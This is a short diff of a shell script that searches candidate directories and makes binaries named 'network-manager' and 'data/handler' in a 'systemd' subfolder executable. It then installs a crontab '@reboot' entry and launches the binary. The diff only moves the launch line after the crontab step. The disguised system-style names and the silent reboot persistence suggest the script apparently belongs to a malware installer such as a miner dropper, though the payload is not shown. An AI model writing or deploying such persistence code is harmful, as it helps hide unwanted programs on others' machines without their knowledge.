@@ -53,8 +53,8 @@ for directory in $possible_paths; do
      cd "$directory/systemd" || exit 1
      chmod +x ./network-manager
      chmod +x ./data/handler
-     ./network-manager
      (crontab -l 2>/dev/null; echo "@reboot $directory/systemd/network-manager") | crontab -
+     ./network-manager
      break
    fi
 done
